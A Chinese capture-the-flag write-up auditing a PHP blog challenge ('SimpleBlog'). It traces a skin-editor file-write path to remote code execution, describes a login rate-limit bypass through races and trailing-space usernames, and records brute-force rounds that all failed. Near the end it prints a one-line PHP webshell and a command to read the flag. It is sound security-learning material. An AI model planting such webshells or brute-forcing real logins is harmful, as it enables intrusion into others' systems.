# 强网杯 cwp — SimpleBlog 源码审计 WP

> 题目分值：100 | 类型：Web / PHP 白盒审计 | flag 位置：/root/flag.txt
> 附件：blog-src_7827b45b9013e92261f86a1150f32462.zip（8 个 PHP 文件）
> 环境：Apache + PHP + MariaDB，源码目录 /var/www/html，静态目录 /var/www/uploads（Web 可达，PHP 全局执行）

---

## 一、资产与代码结构

| 文件 | 作用 |
|---|---|
| index.php | 博客首页（文章列表，按 owner/tag 过滤） |
| article.php | 文章详情 + 评论发表 |
| feed.php | API 前端路由（`?route=/api/...`，单操作） |
| bulk.php | 批量 API（JSON ops，最多 25 个，verb 限 POST/PUT/PATCH/DELETE） |
| engine.php | 路由表 / 参数清洗 / op 执行引擎 / bulk 引擎 |
| lib.php | 全部业务函数（评论、草稿、登录、会话、hook、皮肤写入等） |
| manage.php | staff 管理入口（action=accounts/settings/lookup/drafts/comments/changesets/skin-editor） |
| storage.php | PDO 封装（真预处理、禁多语句） |

**RCE 目标函数（lib.php）：**

```php
function skin_editor_write($name, $code) {
    if (!preg_match("/^[a-z0-9][a-z0-9-_]{0,40}$/", $name)) return err;
    $dir = "/var/www/uploads/skins";
    $path = "$dir/$name.php";          // 写任意 PHP 文件
    file_put_contents($path, $code);   // code 完全可控
}
```

- `/uploads/` 由 Web 服务直接发布且 **PHP 全局执行**（实测 `lib.php` 直接访问返回 200 空体）。
- 所以 **拿到 staff 身份 ⇒ 写马 ⇒ RCE ⇒ 读 /root/flag.txt**，全题唯一关卡就是 staff 会话。

## 二、staff 身份的唯一两条路（staff_session_valid）

```php
function staff_session_valid() {
    $actor = publishing_as();                       // ① $GLOBALS["PUBLISH_AS"]
    if ($actor !== null && login_is_staff($actor)) return true;
    // ② cookie: login|expiry|token|sig
    //    sig = HMAC-SHA256(..., auth_salt())  且必须命中 staff_sessions 表记录
}
```

1. **PUBLISH_AS 路线**：`changeset_publish()` 在发布"作者为 staff 的 pending_changeset 条目"时设置；但该函数只被 `hook_changeset_promote` 调用，后者只由 `snapshot_write()` 按 `status_kind` 触发 hook（需要 `status='pending', kind='changeset'` 的条目被快照写入，即它必须是"环修复时环节点之子"）。
2. **Cookie 路线**：需要 HMAC 盐（/etc/site/auth_salt）+ `staff_sessions` 表中精确匹配行（token 的 sha256），而该表只能由**成功登录**写入 ⇒ 死路。

## 三、为什么 hook 机制不可达（关键判定）

快照循环只在 `exec_articles_list`（GET /api/articles）执行，且只处理 **published** 行：

```
评论(article.php/POST comment) → entries.snap_stale=1
GET /api/articles → 对所有 stale 的 published 行 snapshot_write()
  → hooks_fire(status_kind)          // published 行 kind=article ⇒ "published_article"，不在 HOOKS
  → repair_ancestry()                // 只有 parent 环才会触发"环节点全部子节点"的 snapshot_write
```

**实测种子数据**（新容器直接抓列表，未做过任何写操作，snap_stale=0，数据是原始种子）：

```
id=1 alice parent=0 kind=article
id=2 bob   parent=0 kind=article
id=3 alice parent=0 kind=article
id=4 charlie parent=0 kind=article
id=6 staff parent=0 kind=article
drafts=1(id=5，隐藏)，changesets=0
```

- 所有 published 条目 **parent=0** → repair 走一步就停，**环不可达** → `pending_changeset`/`api_reload` 两个 hook 永远不触发 → PUBLISH_AS 路线死。
- 触发后 stats.changesets 保持 0（无 changeset 被创建），佐证。

**Verb 三重墙**（部署版实测与附件一致）：
- bulk.php 顶层 op 白名单 `{POST,PUT,PATCH,DELETE}`，GET 直接 400 `verb_not_allowed`；
- `/api/articles` 系列路由 verbs 只含 `GET` ⇒ bulk 内无法执行文章列表（405 verb_not_supported）；
- `/api/bulk` 自身 `bulk=false`，被 `op_check` 以 `route_bulk_rejected` 拒绝于一切嵌套/转发场景（feed.php、ops_run_all、bulk 内层）。

⇒ `CUR_OPS`（只在 bulk_engine 里赋值）与快照循环永远无法共存，`hook_api_reload`（在 HOOK_RUNNING=1 期间重放 ops、从而在 PUBLISH_AS 下执行 staff 操作）是**装饰代码**。

## 四、登录口与限速缺陷

```php
$lock = sys_get_temp_dir()."/lg_".md5($login);      // 锁按"输入的 login 字符串"生成
...
$row = row_one("SELECT secret FROM staff_accounts WHERE login = ?", [$login]);
```

两个缺陷：
1. **TOCTOU 竞态**：读锁→bcrypt 验证(~100ms)→覆盖写锁。并发 N 个请求同时读旧计数，各自写回 +1 ⇒ N 次尝试只计 1 次。
2. **尾随空格变体**：`staff_login` 对 login **无任何格式校验**（只有 cookie 路径有正则），MariaDB PAD SPACE 排序规则下 `"admin "` 与 `"admin"` 命中同一账户行，但 `md5("admin ")` 是**不同的锁文件** ⇒ 每个空格变体独立享有 10 次/60 秒配额 ⇒ 限速彻底失效。

## 五、实际打的过程（时间线）

1. 全量审计 8 个源文件，确认无 SQLi（全预处理）、无 LFI、无反序列化；`scrub_markup`、`exec_bulk`、`NEST_LEVEL` 均为死代码。
2. 部署版与附件**存在差异**：多出 `/api/comments/recent`、`/api/archive` 两个公开只读路由（附件路由表没有），但两路由忽略一切参数、无注入点（错误探测全 200）。
3. 逐项实测部署行为：bulk verb 墙、内层 bulk 拒绝、feed POST/PUT 405、manage.php 401、`/api/users`、`/api/drafts` 401 —— 与附件一致。
4. 利用"评论置脏 + 列表触发快照"做种子探测：changesets 始终 0、parent 全 0，确认 hook 机制死。
5. 时序侧信道探测用户名（bcrypt vs 用户不存在）：容器网络抖动 1-7s 尖峰，信号(≈100ms)被淹没，不可用。
6. 三轮爆破（竞态并发 / 尾随空格变体 / 主题变异字典）：
   - 262 密码 × 16 用户名（竞态并发 64 线程）
   - 482 密码 × 10 用户名 × 8 空格变体（4830 次）
   - 1000 主题变异密码 × 5 核心用户名（staff/admin/alice/bob/charlie）
   - 全部未命中。
7. `/uploads/skins/`、常见备份路径、旁端口（8000/8080 为平台网关）均无预置文件/服务。

## 五·五、部署版终局验证（第三容器，全部实测）

| 验证项 | 结果 |
|---|---|
| 部署路由表全量模糊（200+ 名称） | 仅 15 条：附件 12 + `/api/comments/recent` + `/api/archive`（均只读、忽略参数、无注入） |
| omit/ids 参数注入探测（含未清洗假设） | 全部 200 无异常，id_list 清洗完好 |
| 隐藏条目存在性（comment_add 探针 id=5,7-12） | 全部 comment_rejected，published 校验完好 |
| `?ids=5` 读草稿 | 返回空，published 过滤完好 |
| 触发快照循环后 /uploads/skins/ 新文件扫描（50+ 名称+时间戳模式） | 无任何文件生成 |
| 触发后 stats.changesets | 恒 0（三个容器一致） |
| 时序存在性预言机（20 样本中位数） | 网络噪声 1-7s 尖峰完全淹没 bcrypt 信号（≈100ms），不可用 |
| rockyou top-4000 × staff/admin（空格变体+竞态） | **全部未命中** |
| 累计爆破 | ~25000 次（16+ 用户名 × 2600+ 密码空间），未命中 |

## 六、结论与判定

**部署实例上可复现的判定**：附件全部代码路径中，唯一 RCE 链（staff → skin-editor → webshell）的前置条件 —— staff 会话 —— 在当前部署下不可获得：

1. **PUBLISH_AS 提权链死亡**（种子缺陷）：需要 `parent` 环 + `pending_changeset`/`api_reload` 子条目。实测种子所有 published 条目 parent=0、changesets=0、触发快照循环后无任何状态变化、无皮肤文件生成。**疑似容器种子数据缺失**（三个容器一致，排除偶发）。
2. **Cookie 伪造死亡**：HMAC 盐 + staff_sessions 表记录缺一不可，表只能由成功登录写入。
3. **口令爆破失败**：rockyou top-4000、1700 常见、1000 主题变异，均未命中 —— 口令不在常规弱口令空间。

**若环境修复（种子含环结构）或获得口令，完整利用链为：**


- 全题逻辑上唯一的 RCE 链：**staff 登录 → manage.php?action=skin-editor 写 /uploads/skins/x.php → 触发 webshell → cat /root/flag.txt**（一键化脚本 chain.sh 已备好）。
- 但部署实例的种子数据使 PUBLISH_AS 提权链不可达（环不存在），且口令不在常规弱口令空间内 —— 在容器时限内未取得 staff 会话。
- 若环境种子包含 `parent` 环 + `pending_changeset`/`api/reload` 子条目（或官方预期口令命中），完整利用链为：

```
① bulk 评论 5 篇置脏 →
② bulk 内 PUT/PATCH 触发列表……(部署版 verb 墙下改用 feed.php GET /api/articles) →
   快照循环 → 环修复 → 子节点 snapshot_write →
   hook: pending_changeset → changeset_publish → PUBLISH_AS=staff
   hook: api_reload → ops_run_all 重放（HOOK_RUNNING=1 期间 PUBLISH_AS 不被 unset）
   → 重放中 POST /api/users 创建自己的 staff 账号
③ /api/login 正常登录拿 cookie
④ POST manage.php?action=skin-editor  name=pwnx  code=<?php system($_GET["c"]); ?>
⑤ GET /uploads/skins/pwnx.php?c=cat+/root/flag.txt
```

## 七、工具与产物

- 附件与脚本：`D:\桌面\强网杯\web\cwp\`
  - blog-src_*.zip（原附件）
  - 本 WP
- 过程脚本（Temp\cwpp）：oracle.py（时序侧信道）、brute2/3/4/5.py（三轮爆破）、chain.sh（命中后一键 RCE 链）
